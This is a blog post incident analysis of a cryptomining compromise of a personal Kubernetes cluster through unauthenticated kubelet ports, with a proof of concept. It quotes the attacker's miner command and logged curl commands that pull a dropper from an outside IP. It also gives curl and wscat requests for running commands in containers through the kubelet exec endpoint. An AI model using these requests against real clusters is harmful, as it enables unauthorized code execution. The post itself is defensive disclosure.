@@ -1,0 +1,57 @@
+Analysis of a Kubernetes hack — Backdooring through kubelet
+Unless you’ve been living under a rock for the past three years, you’ve probably heard about Kubernetes. At Handy, our infrastructure is backed by a multi-cluster Kubernetes ecosystem that drives our development, CI/CD, and production environments. You could say we are big advocates and users of Kubernetes at Handy, which is why we were both surprised and intrigued to learn that our coworker’s personal Kubernetes cluster was hacked this past weekend.
+We’re very glad it happened as it opened our eyes to a perhaps not so well known security “gotcha” in Kubernetes. In this article we will explore how our coworker’s cluster was hacked and how we recreated this attack in our own cluster as a proof of concept. This method of attack was tested in Kubernetes 1.9 but may also affect older clusters.
+DISCLAIMER: This article is regarding the compromise of a personal server owned by a coworker, not belonging to Handy Technologies. No Handy infrastructure was compromised.
+The hack
+The compromised cluster was a single node Kubernetes deployment running on top of Alpine Linux. The first indicator of compromise was a suspicious process running as a child of the docker daemon:
+/tmp/udevs -o stratum+tcp://pool.zer0day.ru:8080 -u NewWorld -p NewWorld --safe -B
+curling the endpoint returns the following text:
+Mining Proxy Online
+:( It appears someone found a way to drop some crypto mining software on a running container and execute the process.
+Searching for the file udevs in the docker overlay directory for the container ( /var/lib/docker/overlay2/b5a8a22f1e41b3b1ce504a6c941fb2805c28a454f75e2831c3a38d4d35388bd7) uncovered a dropper script named “kube.lock” which downloaded the mining software from transfer.sh and executes it.
+
+Additionally, the MD5 signature (a4404be67a41f144ea86a7838f357c26) for the /tmp/udevs program matches this definition for a possible Monero Miner on VirusTotal:
+Image for post
+So we know the attacker somehow got the kube.lock script in the container and executed it — but how?
+The kubernetes api-server was publicly exposed to the internet — but protected with certificate authentication, so our first inclination was a possible supply chain attack on one of the images running in the cluster. However, upon inspecting the kubelet logs we spotted something:
+...
+/var/log/kubernetes/kubelet.log:E0311 12:38:30.400289    2991 remote_runtime.go:332] ExecSync 95bd5c4a43003517c0077fbad285070fb3c5a94ff5d5c82e02c1d074635d1829 'curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock' from runtime service failed: rpc error: code = Internal desc = transport is closing
+/var/log/kubernetes/kubelet.log:E0311 12:38:30.400974    2991 remote_runtime.go:332] ExecSync 916f8bff4edb547a3e3de184968bb651717883e8b3856e76d0ebc95ecbeb3a3d 'curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock' from runtime service failed: rpc error: code = Internal desc = transport is closing
+...
+It would appear the attacker was somehow issuing exec commands to kubelet. Immediately googling for Kubelet authentication returns this good text from the Kubernetes docs:
+By default, requests to the kubelet’s HTTPS endpoint that are not rejected by other configured authentication methods are treated as anonymous requests, and given a username of system:anonymous and a group of system:unauthenticated.
+Kubelet authentication/authorization
+Production-Grade Container Orchestration
+kubernetes.io
+
+Unless you specify some flags on Kubelet, it’s default mode of operation is to accept unauthenticated API requests. Keep in mind that in order for master -> node communication to work, the Kubernetes API server must be able to talk to kubelet on your nodes.
+As it turns out, our coworker’s server was also publicly exposing the kubelet ports (tcp 10250, tcp 10255). Although the problem here was obvious, it should raise some questions about your own Kubernetes deployment, as it did for us.
+If your users have network access to your nodes, then the kubelet API is a full featured unauthenticated API backdoor to your cluster.
+That is, if you’ve gone through the trouble of enabling Authentication and Authorization (webhook, RBAC, etc) then you should also ensure your kubelet is properly locked down.
+There’s a couple issues floating around raising concern over the security of Kubelet communication, but we feel this issue is not getting the attention it deserved.
+Proof of concept
+In order to send commands directly to kubelet you need to use the API as described briefly here:
+Image for post
+There are two ports that kubelet listens on, 10255 and 10250. The former is a read only HTTP port and the latter is an HTTPS port that can essentially do whatever you want.
+Pick any node in your cluster and try listing pods:
+curl --insecure  https://kube-node-here:10250/pods | jq
+The route for exec , which is undocumented on the kubelet page is somewhat similar to the API server route, but requires two requests: an initial POST, and a follow-up GET with an SPDY capable client (or websocket client which is also supported).
+Execute a command on a running container through kubelet.
+Find a pod running on the node you want to target through the previous request. You can then issue the following request with curl:
+curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://kube-node-here:10250/exec/<namespace>/<podname>/<container-name>?command=touch&command=hello_world&input=1&output=1&tty=1"
+That should return a 302 response with a redirect to a stream you can open:
+< HTTP/2 302
+< location: /cri/exec/PfWkLulG
+< content-type: text/plain; charset=utf-8
+< content-length: 0
+< date: Tue, 13 Mar 2018 19:21:00 GMT
+Now you can use wscat to open the stream:
+wscat -c "https://kube-node-here:10250/cri/exec/PfWkLulG" --no-check                                                                                                                     
+connected (press CTRL+C to quit)
+<
+<
+disconnected
+Since we just issued a simple touch hello_world command, it creates the file and disconnects. If you were to issue a command with output you would see the output after executing the above command.
+Conclusion
+Although this is documented behavior, we would be surprised if more people weren’t aware of this easily made security misconfiguration. In a multi-user Kubernetes environment this represents a big security backdoor if not properly configured.
+I hope we could shed some light on security best practices in Kubernetes and we would love to hear your responses. Leave a comment!
